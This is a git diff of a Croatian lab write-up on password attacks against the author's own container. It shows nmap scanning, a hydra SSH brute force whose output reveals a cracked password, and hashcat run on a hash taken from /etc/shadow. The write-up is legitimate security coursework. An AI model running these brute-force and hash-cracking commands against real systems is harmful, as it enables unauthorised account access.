@@ -6,7 +6,7 @@
 nmap (1)             - Network exploration tool and security / port scanner
 ```
 
-#Online Password Guessing
+## Online Password Guessing
 
 Koristimo nmap na lokalnoj mreži: 
 ``` 
@@ -27,13 +27,14 @@ koji
 skidamo sa servera: ```wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g5/```.
 Sada pozivamo hydra s dobivenim dictionaryjem: ```hydra -l vrandecic_daniel -P dictionary/g5/dictionary_online.txt 10.0.15.0 -V -t 4 ssh```.
 
-```[22][ssh] host: 10.0.15.0   login: vrandecic_daniel   password: byllyt
+```
+[22][ssh] host: 10.0.15.0   login: vrandecic_daniel   password: byllyt
 1 of 1 target successfully completed, 1 valid password found
 ```
 
 Konačno je pronađena lozinka za moj container, byllyt, i sada se mogu prijaviti u container.
 
-#Offline Password Guessing
+## Offline Password Guessing
 
 U /etc/shadow su hashevi lozinki. Željeni hash spremamo u hash.txt. Pokušamo pronaći lozinku pomoću 
 ```hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10```, ali vidimo da bi na ovaj način trebalo bi previše vremena, pa koristimo
